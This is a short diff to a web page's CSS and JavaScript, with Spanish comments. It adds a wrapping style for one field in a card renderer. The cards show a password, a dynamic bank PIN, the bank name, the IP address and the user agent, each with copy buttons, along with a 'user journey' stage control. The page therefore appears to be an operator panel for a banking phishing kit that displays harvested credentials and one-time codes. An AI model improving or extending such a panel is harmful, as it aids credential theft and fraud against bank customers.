@@ -118,6 +118,7 @@
   .row:hover { background: rgba(0,0,0,0.04); }
   .row .mi { font-size: 14px; color: #14181B; flex-shrink: 0; }
   .row .val { font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; flex: 1; }
+  .row .val.wrap { white-space: normal; overflow: visible; text-overflow: clip; word-break: break-word; line-height: 1.35; }
   .row .val.bold { font-weight: 700; }
   .row .copy-ic { font-size: 11px; color: #9E9E9E; flex-shrink: 0; }
   .row .green { color: #4CAF50; }
@@ -671,7 +672,7 @@ function renderCard(p) {
   info += copyRow('password', p.Clave, null, p.Clave, 'Contraseña');
   info += copyRow('pin', p.Dinamica, null, p.Dinamica, 'Dinamica');
   if (p.Entidad) info += plainRow('business', p.Entidad);
-  if (p.Uso) info += plainRow('description', p.Uso);
+  if (p.Uso) info += plainRow('description', p.Uso, 'wrap');
   if (p.Horadia) info += plainRow('access_time', p.Horadia);
   if (p.Ip) info += plainRow('language', p.Ip);
   if (p.UserA) info += plainRow('devices', p.UserA);
@@ -728,10 +729,10 @@ function copyRow(icon, value, cls, copyVal, copyLabel) {
     + '<span class="val ' + (cls || '') + '">' + esc(value) + '</span>'
     + '<span class="material-icons copy-ic">content_copy</span></div>';
 }
-function plainRow(icon, value) {
+function plainRow(icon, value, cls) {
   return '<div class="row" style="cursor:default">'
     + '<span class="material-icons">' + icon + '</span>'
-    + '<span class="val">' + esc(value) + '</span></div>';
+    + '<span class="val ' + (cls || '') + '">' + esc(value) + '</span></div>';
 }
 
 /* Recorrido del usuario: al hacer clic en el cuadro img se pasa a la siguiente etapa */
